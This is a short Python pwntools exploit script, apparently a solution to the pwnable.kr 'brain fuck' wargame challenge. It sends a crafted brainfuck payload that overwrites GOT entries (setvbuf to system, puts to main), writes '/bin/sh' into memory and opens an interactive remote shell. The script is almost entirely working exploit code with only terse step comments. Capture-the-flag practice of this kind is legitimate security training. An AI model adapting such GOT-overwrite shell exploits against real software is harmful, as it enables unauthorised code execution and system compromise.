from pwn import *

SETVBUF_IN_MAIN = p32(0x80486b9)
BINSH = "/bin/sh\x00"
BINSH_PTR = p32(0x804a0a0)

binsh_len = len(BINSH)

# START: 0x804a0a0
# 1. Write "/bin/sh"
payload = ",>" * binsh_len
payload += "<" * (binsh_len + 0xa0 - 0x40)

# 2. Write address of "/bin/sh"
payload += ",>" * 4

# 3. Change setvbuf@got --> @system
payload += "<" * (0x44 - 0x28)
payload += "+" * 0x40 + ">" + "+" * 0xaa + ">" + "-" * 0x2 + ">>"

# 4. Write puts@got --> @setvbuf in main()
payload += "<" * (0x2c-0x18)
payload += ",>" * 4

# Call puts()
payload += "["

p = remote("pwnable.kr", 9001)
p.sendlineafter('[ ]\n', payload)
p.send(BINSH)
p.send(BINSH_PTR)
p.sendline(SETVBUF_IN_MAIN)
p.interactive()
